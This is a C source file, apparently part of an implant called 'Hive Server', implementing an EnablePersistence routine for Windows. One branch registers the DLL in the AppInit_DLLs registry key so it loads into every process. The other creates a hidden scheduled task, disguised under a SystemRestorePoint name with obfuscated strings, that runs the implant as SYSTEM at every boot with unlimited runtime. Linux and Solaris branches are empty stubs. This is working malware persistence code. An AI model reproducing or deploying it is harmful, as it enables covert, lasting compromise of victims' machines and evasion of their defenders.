#include "compat.h"
#include "persistence.h"

#ifdef WIN32

#include <WinBase.h>
#include <InitGuid.h>
#include <Ole2.h>
#include <MSTask.h>
#include <MSTErr.h>
#include <wchar.h>
#include <Psapi.h>
#include "proj_strings.h"
#endif

#ifdef _WINDLL

int EnablePersistence()
{
	HKEY hKey;
	DWORD dwVersion,dwMajorVersion;
	char* key1 = "SOFTWARE\\MICROSOFT\\Windows NT\\CurrentVersion\\Windows";
	BYTE dllPath[MAX_PATH] = {0};
	DWORD dllPathLen = 0;
	BYTE keyData[256] = {0};
	DWORD keyDataType;
	DWORD keyDataLen;
	
	//open the subkey
	if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,key1,NULL,KEY_ALL_ACCESS,&hKey) != ERROR_SUCCESS)
	{
		return -1;
	}
	
	//check our OS Version
	dwVersion = GetVersion();
	dwMajorVersion = (DWORD)(LOBYTE(dwVersion));

	if(6 == dwMajorVersion)
	{
		
		//check and update LoadAppInitDLLs
		if(RegQueryValueExA(hKey,"LoadAppInit_DLLs",NULL,&keyDataType,keyData,&keyDataLen) != ERROR_SUCCESS)
		{
			if(atoi((char*)keyData) != 1)
			{
				if(RegSetValueExA(hKey,"LoadAppInit_DLLs",NULL,keyDataType,"1",2) != ERROR_SUCCESS)
				{
					return -1;
				}
			}
		}
		else
		{
			return -1;
		}
	}
	
	//find out our full path and name
	//the below function does not give the data we want.
	GetModuleFileName(NULL,dllPath,MAX_PATH);
	MessageBox(NULL,dllPath,"Hello5a!",MB_OK);
	if(RegQueryValueExA(hKey,"AppInit_DLLS",NULL,&keyDataType,keyData,&keyDataLen) != ERROR_SUCCESS)
	{
		return -1;
	}

	MessageBox(NULL,keyData,"Hello5b!",MB_OK);
	dllPathLen = strlen((char*) dllPath);
	//add our self to the Appinit_dlls key
	if(RegSetValueExA(hKey,"AppInit_DLLs",NULL,REG_SZ,dllPath,dllPathLen) != ERROR_SUCCESS)
	{
		return -1;
	}

	RegCloseKey(hKey);
	return 0;
}
#elif defined WIN32

int EnablePersistence(char* beaconIP, int beaconPort)
{
	int persistenceEnabled = 0;

	//WCHAR taskName[MAX_PATH] = {system_restore};// L"SystemRestorePoint"; //Name of the Job file
	//WCHAR compareStr[MAX_PATH] = {system_res_job};//L"SystemRestorePoint.job";
	
	/*
	WCHAR taskName[MAX_PATH] =  L"SystemRestorePoint"; //Name of the Job file
	WCHAR compareStr[MAX_PATH] = L"SystemRestorePoint.job";
	*/
	
	WCHAR wszBaseDir[MAX_PATH+1];			//Holds the Start field value of the task
	WCHAR wszAppName[MAX_PATH+1];			//Holds the Run field value of the task
	char szAppName[MAX_PATH+1];
	char szBaseDir[MAX_PATH+1];
	LPWSTR* szNames;
	unsigned long fetchedTasks = 0;
	unsigned long flags = TASK_FLAG_HIDDEN;	//Holds the flag values for the task
	unsigned short newTrigger;
	HRESULT hr = S_OK;
	ITaskScheduler *pITS;
	IEnumWorkItems *pIEnum;
	ITask *pITask;
	IPersistFile *pIPersistFile;
	ITaskTrigger *pITaskTrigger;
	TASK_TRIGGER pTrigger;

	//initialize com and get an instance of the task
	//scheduler object

	hr = CoInitialize(NULL);
	if(FAILED(hr))
	{
		return -1;
	}

	hr = CoCreateInstance(&CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER,
							&IID_ITaskScheduler, (void **) &pITS);

	if(FAILED(hr))
	{
		CoUninitialize();
		return -1;
	}

	//Enumerate through the existing tasks to see if it already exists
	hr = pITS->lpVtbl->Enum(pITS,&pIEnum);//(&pIEnum);
	if(FAILED(hr))
	{
		CoUninitialize();
		return -1;
	}

	while(SUCCEEDED(pIEnum->lpVtbl->Next(pIEnum,5,&szNames,&fetchedTasks)) && (fetchedTasks != 0))
	{
		while(fetchedTasks)
		{
			//if(wcscmp(szNames[--fetchedTasks],system_res_job) == 0)
			if(wcscmp(szNames[--fetchedTasks],sresjBa12) == 0)
			{
				persistenceEnabled = 1;
			}

			CoTaskMemFree(szNames[fetchedTasks]);
		}
		CoTaskMemFree(szNames);
	}

	pIEnum->lpVtbl->Release(pIEnum);

	//create new task if it does not already exist
	if(persistenceEnabled != 0)
	{
		CoUninitialize();
		return 0;
	}

	//create a new work item

	//hr = pITS->lpVtbl->NewWorkItem(pITS,system_restore,&CLSID_CTask,&IID_ITask,(IUnknown**)&pITask);
	hr = pITS->lpVtbl->NewWorkItem(pITS,sresA12,&CLSID_CTask,&IID_ITask,(IUnknown**)&pITask);

	//release pITS because we no longer need it.
	pITS->lpVtbl->Release(pITS);

	if(FAILED(hr))
	{
		CoUninitialize();
		return -1;
	}

	//Create a new trigger for the task
	hr = pITask->lpVtbl->CreateTrigger(pITask,&newTrigger,&pITaskTrigger);
	if(FAILED(hr))
	{
		pITask->lpVtbl->Release(pITask);
		CoUninitialize();
		return -1;
	}

	//zero out the trigger struct
	ZeroMemory(&pTrigger,sizeof(TASK_TRIGGER));

	//set trigger information
	pTrigger.wBeginDay = 1;
	pTrigger.wBeginMonth = 1;
	pTrigger.wBeginYear = 1999;
	pTrigger.cbTriggerSize = sizeof(TASK_TRIGGER);
	pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;

	//set the Trigger
	hr = pITaskTrigger->lpVtbl->SetTrigger(pITaskTrigger,&pTrigger);
	if(FAILED(hr))
	{
		pITask->lpVtbl->Release(pITask);
		pITaskTrigger->lpVtbl->Release(pITaskTrigger);
		CoUninitialize();
		return -1;
	}

	//get the full path and name of the file currently running
	//so we can use it to set the Run field
	GetModuleFileName(NULL,szAppName,MAX_PATH);

	//convert the string to a wide charater string
	mbstowcs(wszAppName,szAppName, MAX_PATH+1);

	//set the Run field
	hr = pITask->lpVtbl->SetApplicationName(pITask,wszAppName);

	//set the account name and password to run the task as
	//the Hive Server runs as SYSTEM with no password
	pITask->lpVtbl->SetAccountInformation(pITask,L"",NULL);

	//Set how long the task will run for.  This sets it to the 
	//max which is 999 days
	hr = pITask->lpVtbl->SetMaxRunTime(pITask,INFINITE);

	//Get the current directory
	GetCurrentDirectory(MAX_PATH,szBaseDir);

	//Convert it to a wide char string
	mbstowcs(wszBaseDir, szBaseDir,MAX_PATH+1);

	//Set the start in field
	hr = pITask->lpVtbl->SetWorkingDirectory(pITask, wszBaseDir);

	//Set the task file flags so that the file is hidden
	hr = pITask->lpVtbl->SetFlags(pITask,flags);

	//Get a new PersistFile object so that we can save the job/task 
	//that was just created.
	hr = pITask->lpVtbl->QueryInterface(pITask,&IID_IPersistFile,(void**)&pIPersistFile);

	pITask->lpVtbl->Release(pITask);

	//Save the scheduled task to disk
	hr = pIPersistFile->lpVtbl->Save(pIPersistFile,NULL,TRUE);

	if(FAILED(hr))
	{
		pITask->lpVtbl->Release(pITask);
		pITaskTrigger->lpVtbl->Release(pITaskTrigger);
		pIPersistFile->lpVtbl->Release(pIPersistFile);
		CoUninitialize();
	}

	//CleanUp
	pITaskTrigger->lpVtbl->Release(pITaskTrigger);
	pIPersistFile->lpVtbl->Release(pIPersistFile);
	CoUninitialize();
	return 0;
}
#elif defined LINUX

int EnablePersistence(char* beaconIP, int beaconPort)
{
//TODO: just to silence the compiler warning
beaconIP++;
beaconPort++;

	return 0;
}

#elif defined SOLARIS

int EnablePersistence(char* beaconIP, int beaconPort)
{
//TODO: just to silence the compiler warning
beaconIP++;
beaconPort++;

	return 0;
}

#endif
